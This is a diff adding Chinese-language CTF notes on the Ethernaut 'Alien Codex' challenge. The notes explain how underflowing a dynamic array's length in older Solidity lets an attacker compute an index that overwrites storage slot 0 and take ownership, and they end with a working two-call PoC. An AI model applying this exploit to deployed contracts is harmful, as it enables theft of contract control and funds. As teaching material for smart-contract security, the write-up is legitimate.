@@ -1106,3 +1106,87 @@ await contract.setSolver(txn.contractAddress)
 参考资料：
 - [Learn EVM in depth #2. Executing the bytecode step by step in the deployment of a contract.](https://medium.com/coinmonks/learn-evm-in-depth-2-executing-the-bytecode-step-by-step-in-the-deployment-of-a-contract-270a6335df75)
 - [https://www.evm.codes/playground](https://www.evm.codes/playground)
+
+# Alien Codex
+- 本题参考资料：[ABI docs](https://docs.soliditylang.org/en/v0.4.21/abi-spec.html)
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "../helpers/Ownable-05.sol";
+
+contract AlienCodex is Ownable {
+    bool public contact;
+    bytes32[] public codex;
+
+    modifier contacted() {
+        assert(contact);
+        _;
+    }
+
+    function makeContact() public {
+        contact = true;
+    }
+
+    function record(bytes32 _content) public contacted {
+        codex.push(_content);
+    }
+
+    function retract() public contacted {
+        codex.length--;
+    }
+
+    function revise(uint256 i, bytes32 _content) public contacted {
+        codex[i] = _content;
+    }
+}
+```
+目标是夺取合约控制权（即将 owner 状态变量设置为我们的地址，这个变量来自继承的 Ownable 合约）。在 Solidity 0.5.0 之前，动态数组的长度是可修改的，codex.length-- 可以将数组长度减少。当数组长度减少到零以下时，会发生什么？在 Solidity 0.5.0 之前，codex.length-- 可能导致数组长度下溢，从而变成一个非常大的数。
+
+Solidity 中的存储是连续的，数组的元素紧跟在数组的起始位置之后。如果我们能够计算出存储槽的位置，就有可能覆盖其他状态变量。
+
+- Solidity 存储布局： 在 Solidity 中，状态变量在存储中的布局遵循以下原则：
+    - 每个状态变量存储在256位（32字节）的存储槽（slot）中。状态变量按照声明的顺序存储。 继承的合约优先。
+    - 如果多个状态变量的大小加起来不超过32字节，它们可以打包存储在同一个slot中。
+    - 动态大小的类型（如数组、映射）会占用单独的slot来存储指向其数据的指针。
+    - 动态数组（如 bytes32[]）的存储方式：数组的长度存储在一个槽中，其位置通过 keccak256(数组槽位置) 计算得到。数组的元素从计算得到的槽位置开始顺序存储。
+```
+array[0] = keccak256(uint256(slot)) + 0
+array[1] = keccak256(uint256(slot)) + 1
+...
+array[MAX] = keccak256(uint256(slot)) + 2 ^ 256
+```
+
+```js
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
+'0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",1)
+'0x0000000000000000000000000000000000000000000000000000000000000000'
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",2)
+'0x0000000000000000000000000000000000000000000000000000000000000000'
+```
+ownable 里有一个 owner 变量（address 类型，20 bytes）。然后 AlienCodex 里有俩变量（bool，bytes32[]）。根据上面的介绍，显然 address、bool在slot0，动态数组在slot1。这里我们还可以验证一下：
+```js
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
+'0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'
+                          ⬆️ 这里变成了1 0bc04aa6aac163a6b3667636d798fa053d43bd11 刚好40个chars，20bytes
+                        bool, address
+```
+证明我们分析的正确性。 所以 codex 数组的起始槽位置为 1。数组元素的存储起始位置为 keccak256(1)。可以通过计算覆盖到其他存储槽。
+已知 array[0] = keccak256(uint256(1)) + 0，我们想要访问 slot 0，array[x] = 0 = keccak256(uint256(1)) + x
+=> x = 0 - keccak256(uint256(1)) =  2^256 - keccak256(uint256(1)) = 2^256-1-keccak256(uint256(1))+1
+
+```solidity
+uint256 public index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1)))); // 需要用低版本的 solidity
+// or
+uint256 public index2 = (2**256 - 1) - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
+// 35707666377435648211887908874984608119992236509074197713628505308453184860938
+// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+```
+但直接 revise player 地址也会有问题，因为 bytes[] 是大端序，这个数据会写到 0x前半截，而我们知道存储布局 owner 在slot0 0x....address的尾部。所以需要对player填充前导0。
+
+POC:
+```solidity
+await contract.retract() // codex underflow
+await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", web3.utils.padLeft(player, 64))
+```
